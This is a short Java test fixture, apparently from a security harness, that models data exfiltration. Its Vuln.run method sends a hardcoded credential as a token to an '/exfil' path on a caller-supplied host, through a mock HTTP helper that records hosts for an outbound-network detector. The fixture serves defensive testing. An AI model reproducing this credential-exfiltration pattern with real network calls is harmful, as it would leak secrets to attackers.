// Phase 11 (Track J.9) — Java DATA_EXFIL vuln fixture.
//
// Models an unguarded outbound HTTP call that exfiltrates a static
// credential to an attacker-controlled host.  Java has no stdlib
// monkey-patch hook for `HttpURLConnection`, so the fixture calls into
// the harness-supplied `NyxMockHttp.get(url)` helper.  The helper
// parses the URL host and appends it to `NyxMockHttp.CAPTURED_HOSTS`
// without initiating real wire I/O; the harness drains the list after
// `run` returns and emits one `ProbeKind::OutboundNetwork { host }` per
// captured call.  `OutboundHostNotIn` fires when the host falls outside
// the loopback allowlist.
public class Vuln {
    public static void run(String host) throws Exception {
        String secret = "alice-creds";
        NyxMockHttp.get("http://" + host + "/exfil?token=" + secret);
    }
}
